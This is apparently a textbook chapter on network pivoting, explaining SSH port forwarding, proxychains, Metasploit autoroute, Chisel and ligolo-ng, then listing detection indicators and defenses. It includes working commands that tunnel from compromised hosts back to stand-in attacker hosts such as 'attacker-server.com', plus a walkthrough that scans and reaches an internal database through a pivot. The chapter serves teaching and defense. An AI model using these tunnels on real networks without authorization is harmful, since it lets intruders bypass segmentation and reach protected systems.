## 1. What is Pivoting?

### 📘 Formal Definition

**Pivoting** is a post-exploitation technique in which an attacker uses a **compromised host** as an intermediary to **access and attack otherwise unreachable network segments or systems** — using the compromised host as a launching platform to reach deeper into a target network.

### 🧠 Simple Explanation

Imagine a target organization's network has multiple isolated segments — a DMZ, an internal office network, and a secure database network. An attacker who compromises a server in the DMZ can't directly reach the internal database. **Pivoting** uses that compromised DMZ server as a relay point — routing attacker traffic through the compromised server to reach the otherwise inaccessible internal database.

### 🪨 Real-World Analogy: Stepping Stones Across a River

> Crossing a wide river directly is impossible in one jump. But if there are rocks (compromised hosts) sticking up from the water at intervals, you can cross by jumping from rock to rock — using each one as a stepping stone to the next. Each rock brings you closer to the far bank (the ultimate target). **Pivoting is exactly this** — using compromised systems as stepping stones to cross network boundaries that would otherwise be impossible to traverse directly.

### 🌍 Real-World Examples

- A red team compromises a public-facing web server, then pivots through it to reach the internal application servers that have no direct Internet exposure
- Ransomware that compromises one endpoint uses it to pivot and reach file servers, backup systems, and domain controllers
- A penetration tester uses SSH tunneling through a compromised jump host to scan and attack the internal network from inside

## 2. Why Pivoting Exists — The Network Reality

### 🏗️ The Segmented Network Problem

Real enterprise networks are **not flat** — they use firewalls (*Chapter 29*), VLANs (*Chapter 18*), and segmentation (*Chapter 34*) to separate systems into isolated zones:

```
 [ Internet ]
      |
 [ DMZ: 10.0.1.0/24 ]
      | (firewall — limited DMZ->Internal access)
 [ Internal: 192.168.1.0/24 ]
      | (firewall — very restricted Internal->Database access)
 [ Database: 10.10.10.0/24 ]
```

An attacker who gains access from the Internet can only directly reach the DMZ. The Internal and Database networks are **not reachable from the Internet**. Pivoting solves this — using the compromised DMZ host as a relay to reach those restricted networks.

### 🎯 What Makes a Host Pivotable

A compromised host can serve as a pivot point if:
- It has **network access to a segment** the attacker can't directly reach
- The attacker has **sufficient control** (shell, agent, malware) to route traffic through it
- Firewall rules allow **traffic from that host** to the target segment

## 3. The Pivoting Concept — How It Works

```
 Without Pivot (direct — impossible):
 [ Attacker ] --X--> [ Database Server: 10.10.10.50 ]
                     (firewall blocks direct access)

 With Pivot through compromised DMZ host:
 [ Attacker ] --> [ Compromised Web Server: 10.0.1.10 ] --> [ Database: 10.10.10.50 ]
                  (firewall allows web server to reach DB)
```

The compromised host acts as a **relay** — receiving the attacker's traffic and forwarding it onward into the restricted network, then returning responses back to the attacker.

### 🧠 The Three Network Segments in Pivoting

| Segment | Description |
|---|---|
| **Attacker's Network** | The network the attacker controls and originates from |
| **Pivot Host's Network** | The network the compromised host is on — reachable from attacker |
| **Target Network** | The restricted segment the attacker wants to reach — only reachable via pivot |

## 4. The Pivot Host

### 🎯 What Makes a Good Pivot Host

| Property | Importance |
|---|---|
| **Multi-homed** | Connected to multiple network segments simultaneously — the ideal pivot |
| **High trust level** | Firewall rules typically allow a trusted internal server more access than external attackers |
| **Persistent access** | The attacker must maintain stable access to the pivot host throughout the operation |
| **Low visibility** | Pivoting through a busy, high-traffic server is harder to detect than through an isolated one |

### 🧠 Real-World Example of a Multi-Homed Host

```
 Web Server (compromised):
   eth0: 10.0.1.10 (DMZ — reachable from Internet)
   eth1: 192.168.1.50 (Internal network — NOT reachable from Internet)

 The web server has a network interface on BOTH segments
 -> It can reach the internal network
 -> Attacker can pivot through it to reach 192.168.1.0/24
```

### 🎯 Types of Pivot Hosts

| Type | Description |
|---|---|
| **Multi-homed server** | Physically or logically connected to multiple network segments |
| **Jump host** | A server designed as a gateway between segments — high value to compromise |
| **Domain controller** | Has broad network access across the domain by design |
| **Security appliance** | VPN concentrators, firewalls, and SIEM forwarders have extensive network reach |
| **Any compromised host** | Even a single-homed host can pivot if the firewall allows it outbound to the target |

## 5. Pivoting Techniques

| Technique | Tool/Method | Complexity | Use Case |
|---|---|---|---|
| **SSH Local Port Forwarding** | ssh -L | Low | Single port forwarding through SSH |
| **SSH Remote Port Forwarding** | ssh -R | Low | Reverse tunnel for restricted environments |

| **SOCKS via agent** | Metasploit, Chisel | Medium | Framework-based SOCKS pivot |

| **Chisel tunnel** | chisel | Medium | Modern HTTP-based tunneling for pivoting |
| **ligolo-ng** | ligolo-ng | Medium | Transparent network-level pivoting |
| **Double pivot** | Chained tunnels | High | Reaching deeply nested network segments |

## 6. SSH Port Forwarding as a Pivot

SSH tunneling (*Chapter 32, Section 5*) is the most common, built-in pivoting technique — requiring only SSH access to the pivot host.

### 🎯 Local Port Forwarding Pivot

Forward a local port to a service on the target network, routed through the pivot host:

```bash
# Forward local port 3306 to the internal DB server, through the compromised web server:
ssh -L 3306:192.168.1.100:3306 attacker@10.0.1.10

# Now connect to "local" port 3306 to reach the internal DB:
mysql -h 127.0.0.1 -P 3306 -u root -p
# Traffic actually going: Attacker:3306 -> SSH Tunnel -> 10.0.1.10 -> 192.168.1.100:3306
```

### 🎯 Remote Port Forwarding Pivot (Reverse Tunnel)

Useful when the attacker **cannot initiate outbound connections** to the pivot host — instead, the compromised host reaches out to the attacker:

```bash
# On the compromised host (initiating connection outbound to attacker):
ssh -R 9001:192.168.1.100:3306 attacker@attacker-server.com

# Attacker connects to local port 9001 on their machine to reach the internal DB:
mysql -h 127.0.0.1 -P 9001
# Traffic: Attacker:9001 -> Reverse SSH Tunnel -> Pivot Host -> 192.168.1.100:3306
```

This is particularly powerful in scenarios where inbound connections to the compromised host are blocked — the host "calls back" to the attacker.

## 7. SOCKS Proxy Pivoting

Dynamic SSH port forwarding (*Chapter 32, Section 5*) creates a **SOCKS proxy** that routes **any TCP traffic** through the pivot host — enabling access to the entire target subnet, not just a single port.

```bash
# Create SOCKS proxy through the compromised host on local port 1080:
ssh -D 1080 attacker@10.0.1.10

# Configure tools to use the SOCKS proxy:
proxychains nmap -sV 192.168.1.0/24   # Nmap scan through pivot
proxychains curl http://192.168.1.10   # HTTP request through pivot
```

### 🧠 proxychains

**proxychains** is a Linux tool that forces any TCP-capable application to route its traffic through a configured SOCKS proxy — enabling tools like Nmap, curl, ssh, and many others to work through a pivot without native proxy support.

```bash
# /etc/proxychains.conf:
[ProxyList]
socks4 127.0.0.1 1080   # SOCKS proxy on local port 1080

# Use any tool through the pivot:
proxychains nmap -sT -p 80,443,22 192.168.1.0/24
proxychains ssh user@192.168.1.50
```

## 8. Metasploit Route Pivoting

The **Metasploit Framework** includes native pivoting capabilities — once an attacker has a Meterpreter session on a pivot host, they can add routes to reach additional networks.

```bash
# In Metasploit, with a Meterpreter session on the pivot host:
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set SUBNET 192.168.1.0
msf6 post(autoroute) > run

# Alternative: add route manually
msf6 > route add 192.168.1.0/24 1   # Route 192.168.1.0/24 through session 1

# Now all Metasploit modules targeting 192.168.1.x go through the pivot:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run   # Scan routes through the pivot session
```

### 🧠 SOCKS via Metasploit

Metasploit can also create a SOCKS server routing traffic through an existing Meterpreter session:

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# Now proxychains routes through the Metasploit SOCKS proxy -> Meterpreter session -> target network
```

## 9. Chisel and ligolo-ng — Modern Pivoting Tools

Modern penetration testers frequently use purpose-built tools designed specifically for pivoting in constrained environments.

### 🎯 Chisel

**Chisel** is a fast TCP/UDP tunnel transported over HTTP, secured using SSH. It's particularly useful when only HTTP/HTTPS outbound traffic is permitted from the pivot host.

```bash
# On attacker machine (server mode):
chisel server --reverse --port 8080

# On compromised pivot host (client mode):
chisel client attacker-server.com:8080 R:socks

# Result: SOCKS proxy on attacker's machine routing through pivot host
# Use proxychains to access the internal network
```

### 🎯 ligolo-ng

**ligolo-ng** provides a **transparent network-level pivot** — creating a virtual network interface on the attacker's machine that routes traffic to the target network through the pivot host, without needing proxychains or per-tool configuration.

```bash
# On attacker machine:
./proxy -selfcert

# On compromised pivot host:
./agent -connect attacker:11601 -ignore-cert

# In ligolo console:
>> session   # Select the agent session
>> ifconfig  # View networks reachable from pivot host
>> start     # Start the tunnel

# On attacker machine — add route to internal network:
ip route add 192.168.1.0/24 dev ligolo

# Now: ALL tools on the attacker machine reach 192.168.1.0/24 transparently
nmap -sV 192.168.1.0/24   # No proxychains needed!
```

> 🔑 **ligolo-ng** is particularly powerful because it creates a **transparent routed pivot** — the attacker's machine appears to have direct connectivity to the target network, allowing any tool to work without proxy configuration.

### Choosing the Right Pivoting Technique

| Situation | Recommended Technique |
|---|---|
| Forward a single service | SSH Local Port Forwarding (`ssh -L`) |
| Access an entire subnet | SSH Dynamic Port Forwarding (`ssh -D`) + proxychains |
| Pivot over HTTP/HTTPS only | Chisel |
| Transparent routing for all tools | ligolo-ng |
| Existing Meterpreter session | Metasploit autoroute + SOCKS |

## 10. Double Pivoting

### 📘 Formal Definition

**Double pivoting** (or **chained pivoting**) is the technique of pivoting through **two or more intermediate compromised hosts** to reach deeply nested network segments inaccessible from any single pivot point.

### 🧠 How It Works

```
 Network Architecture:
 [ Internet ]
      |
 [ DMZ: 10.0.1.0/24 ]          <- Pivot 1 compromised here
      | (firewall)
 [ Internal: 192.168.1.0/24 ]  <- Pivot 2 compromised here
      | (firewall)
 [ Secure DB: 10.10.10.0/24 ]  <- ULTIMATE TARGET

 Single pivot: Attacker -> DMZ -> Internal (reachable)
               But cannot reach DB from here

 Double pivot: Attacker -> DMZ -> Internal -> DB (reachable!)
```

### 🧠 Implementation (SSH Chained)

```bash
# Step 1: Pivot through DMZ host to internal host:
ssh -L 2222:192.168.1.50:22 attacker@10.0.1.10
# (Forward local port 2222 to internal host's SSH through DMZ)

# Step 2: Second pivot through internal host to DB network:
ssh -L 5432:10.10.10.20:5432 -p 2222 attacker@127.0.0.1
# (Connect to "local" port 2222 -> goes to internal host ->
#  forward to DB server's PostgreSQL port)

# Attacker connects to local port 5432 and reaches the DB server
# Traffic path: Attacker -> DMZ Server -> Internal Server -> DB Server
```

## 11. Pivoting and Lateral Movement

Pivoting and **lateral movement** are closely related but distinct concepts:

| Concept | Definition | Focus |
|---|---|---|
| **Pivoting** | Using a compromised host as a relay to **reach** otherwise inaccessible network segments | Network access — bridging network boundaries |
| **Lateral Movement** | Moving **between hosts** within the same network segment using credentials, exploits, or trust relationships | Host-to-host movement within a reachable segment |

```
 Pivoting crosses network boundaries:
 [ Attacker ] -> [ Pivot: DMZ ] -> [ Internal Network ]

 Lateral Movement moves between hosts within a segment:
 [ Internal Host A ] -> [ Internal Host B ] -> [ Internal Host C ]
 (all within 192.168.1.0/24 — no pivot needed)
```

> 🔑 In a real attack, these techniques are **combined** — an attacker pivots into a new segment and then uses lateral movement to spread across hosts within that segment, before pivoting again into the next restricted zone.

## 12. How Attackers Chain Pivots

A sophisticated real-world attack chain combining pivoting, lateral movement, and tunneling:

```
 1. INITIAL COMPROMISE
    Attacker exploits web server vulnerability
    -> Gains shell on DMZ server (10.0.1.10)

 2. PIVOT 1 ESTABLISHED
    Attacker sets up SOCKS proxy through DMZ server
    -> Can now reach Internal network (192.168.1.0/24)

 3. INTERNAL RECONNAISSANCE
    Attacker runs Nmap through pivot -> discovers internal hosts
    -> Finds domain controller at 192.168.1.5
    -> Finds file server at 192.168.1.20

 4. LATERAL MOVEMENT
    Attacker compromises file server using stolen credentials
    -> File server has access to DB network (10.10.10.0/24)

 5. PIVOT 2 ESTABLISHED
    Attacker sets up second pivot through file server
    -> Can now reach DB network

 6. TARGET REACHED
    Attacker accesses database server directly
    -> Extracts all customer data
    -> Mission complete
```

## 13. How This Works in Real Life

| Environment | Pivoting in Practice |
|---|---|
| **Enterprise Networks** | Penetration testers routinely pivot from internet-facing systems to internal networks; real attackers use the same path — proper segmentation (*Chapter 34*) is the primary defense |
| **Data Centers** | Compromised internet-facing application servers provide pivot points into backend database and management networks |
| **Cloud Environments** | Compromised cloud instances pivot to other VPC subnets, internal services, and metadata endpoints |
| **Red Team Operations** | Pivoting is a core red team technique — demonstrating the real-world impact of compromising one internet-facing host |
| **SOC** | Detecting pivoting involves identifying unexpected cross-segment traffic, unusual connections from server-class hosts, and anomalous SOCKS/tunnel traffic in firewall and IDS logs |

### Where Pivoting Commonly Appears

Pivoting is frequently encountered during:

- Internal penetration tests
- Red team engagements
- Active Directory compromise assessments
- Incident response investigations
- Ransomware attacks
- Advanced Persistent Threat (APT) intrusions

Understanding pivoting is valuable for both offensive and defensive cybersecurity roles.

## 14. Pivoting and Cybersecurity

| Security Context | Relevance |
|---|---|
| **Why Segmentation Matters** | Pivoting demonstrates exactly why network segmentation (*Chapter 34*) is so critical — without it, compromising one host gives access to everything |
| **Penetration Testing** | Pivoting is a standard technique in internal network assessments — demonstrating that a firewall bypass through a compromised host can expose "protected" internal systems |
| **Incident Response** | Investigators trace lateral movement and pivoting paths by analyzing firewall logs, authentication events, and network flow data to reconstruct how an attacker moved through the network |
| **Red Team vs. Blue Team** | Red teams use pivoting to demonstrate impact; blue teams must detect it through anomaly detection, network monitoring, and log correlation |
| **Zero Trust** | Zero Trust architectures (*Chapter 35*) directly address pivoting by requiring verification for every connection — even within the network — making pivoting through a compromised host much less effective |

### Why SOC Analysts Monitor for Pivoting

Possible indicators include:

- A server suddenly initiating connections to new internal systems
- Unexpected SSH tunnels
- SOCKS proxy processes running on servers
- Large increases in east-west traffic
- Multiple internal hosts contacted by one compromised system
- Long-lived encrypted connections to unusual destinations

These behaviors often indicate post-exploitation activity rather than initial compromise.

## 15. Defenses Against Pivoting

| Defense | How It Works |
|---|---|
| **Network Segmentation** | Strict firewall rules between zones limit what a compromised host in one zone can reach — the foundation of pivot defense (*Chapter 34*) |
| **Least Privilege Networking** | Hosts only have network access to exactly what they need — a web server should never have a direct connection to the database of another department |
| **East-West Traffic Monitoring** | IDS/IPS (*Chapter 30*) deployed on internal segments detects unusual traffic patterns from compromised hosts |
| **Host-Based IPS/EDR** | Detects unexpected outbound connections, SOCKS proxy creation, and anomalous process behavior on the pivot host |
| **Anomalous Port/Protocol Detection** | Detecting tools like Chisel (HTTP tunnel), SSH to unusual destinations, or SOCKS proxy traffic from server hosts |
| **Network Flow Analysis** | Unusual traffic volumes or connections from typically quiet server hosts are strong indicators of pivoting activity |
| **Jump Host Hardening** | Legitimate jump hosts should be heavily monitored — any pivot through them is immediately visible |
| **Zero Trust Architecture** | Requiring authentication and authorization for every connection eliminates the inherent trust that makes pivoting effective (*Chapter 35*) |

## 16. Troubleshooting Perspective

| Problem | Symptom | Pivoting as Potential Cause | Investigation |
|---|---|---|---|
| Unexpected cross-segment traffic | Firewall logs showing unusual connections from a DMZ server to internal hosts | Attacker using compromised server to pivot | Identify which process/user initiated the connection; correlate with IDS alerts |
| Anomalous outbound connections from servers | Server hosts making unexpected outbound SSH or HTTP connections | Reverse tunnel or agent callback from pivot host | Investigate the destination IP; check for unauthorized processes on the server |
| Internal segment appears "exposed" | Evidence of scanning or exploitation attempts against internal systems | Attacker pivoting through a compromised perimeter host | Trace the originating IP — does it belong to a network device or server that should not be initiating such traffic? |
| SOCKS proxy detected on a host | EDR alerting on unexpected proxy/tunnel process | Legitimate tool being abused, or attacker pivot setup | Identify the process, owner, and connections; check for concurrent compromise |

## 17. Real-World Walkthrough: Pivoting Through a Compromised Web Server

> ⚠️ For educational purposes only. Only perform on authorized lab environments.

**Scenario:** A penetration tester has compromised a web server in the DMZ and wants to reach the internal network.

**Network:**
```
 Attacker:          10.10.10.5 (on Internet-facing range)
 DMZ Web Server:    10.0.1.10  (compromised — attacker has SSH)
 Internal Network:  192.168.1.0/24 (target — not directly reachable)
 Internal DB:       192.168.1.100:3306
```

**Step 1 — Verify the pivot host's network access:**
```bash
# On compromised web server:
ip addr show         # View all network interfaces
ip route show        # View routing table
ping 192.168.1.100   # Verify internal reachability
```
```
 Confirmed: web server can reach 192.168.1.0/24
 Attacker cannot directly reach 192.168.1.0/24
```

**Step 2 — Set up SOCKS pivot via dynamic SSH forwarding:**
```bash
# From attacker machine:
ssh -D 1080 -f -N attacker_user@10.0.1.10
# -D 1080: create SOCKS proxy on local port 1080
# -f: run in background
# -N: no remote command — just maintain tunnel
```

**Step 3 — Configure proxychains:**
```bash
# /etc/proxychains.conf:
socks5 127.0.0.1 1080
```

**Step 4 — Scan the internal network through the pivot:**
```bash
proxychains nmap -sT -p 22,80,443,3306,5432 192.168.1.0/24
```
```
 192.168.1.10  - 80/tcp open   (internal web server)
 192.168.1.100 - 3306/tcp open (internal MySQL database)
 192.168.1.5   - 22/tcp open   (internal SSH server)
```

**Step 5 — Connect to the internal database through the pivot:**
```bash
proxychains mysql -h 192.168.1.100 -u root -p
# Traffic path: Attacker -> SOCKS:1080 -> SSH Tunnel -> 10.0.1.10 -> 192.168.1.100:3306
```

**What this demonstrates:**
- The internal database was completely inaccessible from the Internet
- A single compromised DMZ host provided complete access
- The firewall protecting the internal network was completely bypassed
- **This is exactly why network segmentation must be implemented with least-privilege firewall rules between all segments, not just between Internet and DMZ**

### What You Should Observe

During the walkthrough, identify:

- The compromised pivot host
- The network segments involved
- The SOCKS proxy creation
- The traffic flowing through the SSH tunnel
- The internal hosts discovered via the pivot
- The firewall being bypassed through an authorized host
- How segmentation limited the attacker's initial access

Being able to explain the complete pivot path is an important skill for penetration testers, incident responders, and SOC analysts.

## 18. Common Beginner Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| Pivoting requires advanced hacking skills | SSH dynamic port forwarding is built into every Linux/macOS system and requires only basic command knowledge |
| A firewall between zones prevents pivoting | Firewalls prevent **direct** access — if a host inside the zone is compromised, the firewall's internal rules may allow that host to pivot further |
| Pivoting only works in penetration testing labs | Pivoting is a real-world attacker technique documented in countless breach investigations |
| Only multi-homed hosts can be used for pivoting | Any compromised host with firewall-permitted access to another segment can be a pivot — even if it only has one network interface |
| Detecting pivoting is easy because the traffic looks obviously malicious | Pivoting traffic often looks like legitimate SSH, HTTP, or HTTPS — it requires behavioral analysis and traffic pattern recognition, not just port or IP blocking |
| Once you have a pivot, you can reach everything | Pivoting bypasses one network boundary — additional firewalls, segmentation, and host-level controls still apply within the pivoted-to segment |
| Pivoting and lateral movement are the same technique | Pivoting crosses **network boundaries**; lateral movement moves **between hosts within the same segment** — both are often used together |
| Compromising a single host always allows access to the entire network | Well-designed segmentation, least-privilege networking, and Zero Trust can significantly limit how far an attacker can pivot. |

## 20. Common Interview Questions

1. **What is pivoting in cybersecurity?** Using a compromised host as an intermediary to reach network segments that are otherwise inaccessible from the attacker's original position.
2. **What is the difference between pivoting and lateral movement?** Pivoting crosses network boundaries between isolated segments; lateral movement moves between hosts within the same segment.
3. **What makes a host a good pivot point?** Network access to otherwise unreachable segments, high trust level within the network, and stable attacker control.
4. **How does SSH dynamic port forwarding enable pivoting?** The `-D` option creates a SOCKS proxy on a local port — all traffic routed through the proxy travels through the SSH tunnel to the pivot host and exits into the target network.
5. **What is a reverse tunnel and when is it used?** An SSH `-R` tunnel where the compromised host initiates a connection back to the attacker — used when inbound connections to the pivot host are blocked by a firewall.
6. **What is proxychains and how does it work with pivoting?** A Linux tool that forces TCP applications to route through a configured SOCKS proxy — enabling tools like Nmap and SSH to work through a pivot without native proxy support.
7. **What is double pivoting?** Chaining two or more pivot hosts to reach network segments not reachable from any single pivot point.
8. **How does Chisel differ from SSH tunneling for pivoting?** Chisel transports tunnels over HTTP/HTTPS — useful when only web traffic is permitted outbound from the pivot host.
9. **What is the most effective defense against pivoting?** Strict network segmentation with least-privilege firewall rules between zones — ensuring compromised hosts in one zone have minimal ability to reach other zones.
10. **How does Zero Trust architecture reduce pivoting effectiveness?** By requiring authentication and authorization for every connection regardless of network position — a compromised pivot host still can't access resources without valid credentials and authorization.

## 21. Key Takeaways

### 📋 Summary

- **Pivoting** uses a compromised host as a relay to reach network segments the attacker couldn't otherwise access — exploiting the trust and network access that host already has.
- The **pivot host** is typically multi-homed or has firewall-permitted access to the target segment — jump hosts, web servers, and domain controllers are common targets.
- **SSH port forwarding** (local `-L`, remote `-R`, dynamic `-D`) provides the most accessible pivoting mechanism, built into every Linux/macOS system.
- **SOCKS proxy pivoting** with proxychains enables any TCP-capable tool to work through a pivot transparently.
- Modern tools like **Chisel** and **ligolo-ng** provide HTTP-based and transparent network-level pivoting for constrained environments.
- **Double pivoting** chains multiple pivot hosts to reach deeply nested restricted segments.
- Pivoting and **lateral movement** are complementary — pivoting crosses network boundaries, lateral movement spreads within a segment.
- Primary defenses are **strict network segmentation**, **east-west traffic monitoring**, **least-privilege firewall rules**, and **Zero Trust architecture**.
